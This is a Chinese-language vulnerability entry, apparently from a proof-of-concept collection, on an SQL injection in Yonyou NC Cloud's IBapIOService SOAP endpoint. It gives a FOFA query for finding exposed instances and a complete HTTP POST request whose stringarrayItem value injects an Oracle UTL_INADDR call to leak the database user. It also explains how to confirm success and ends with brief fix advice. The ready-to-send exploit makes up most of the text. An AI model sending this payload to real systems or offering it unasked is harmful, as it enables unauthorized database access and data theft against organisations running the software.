## 用友NC Cloud IBapIOService SQL注入漏洞

## 漏洞描述
用友 NC Cloud 的 SOAP 服务 `nc.itf.bap.service.IBapIOService` 在处理 `stringarrayItem` 参数时未进行过滤，攻击者可通过 SOAP 请求注入数据库函数，例如 `UTL_INADDR.GET_HOST_ADDRESS`，以窃取数据库信息或进一步执行命令。

## 资产测绘
```
fofa: app="用友-NC-Cloud"
```

## POC
```
POST /uapws/service/nc.itf.bap.service.IBapIOService HTTP/1.1
Host: <target>
User-Agent: Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept-Encoding: gzip
Content-Type: text/xml
Connection: close

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gs="http://service.bap.itf.nc/IBapIOService">
  <soapenv:Header/>
  <soapenv:Body>
    <gs:getBapTableDatas>
      <gs:stringarrayItem>DWQueue@MessageQueue' AND 1=UTL_INADDR.GET_HOST_ADDRESS(''||(user)||'')-- abc</gs:stringarrayItem>
    </gs:getBapTableDatas>
  </soapenv:Body>
</soapenv:Envelope>
```
若响应中包含当前数据库用户名或发生异常，即可确认漏洞存在。

## 修复建议
- 对 SOAP 参数做白名单校验，使用预编译语句
- 限制数据库账号权限，禁止执行外部网络函数

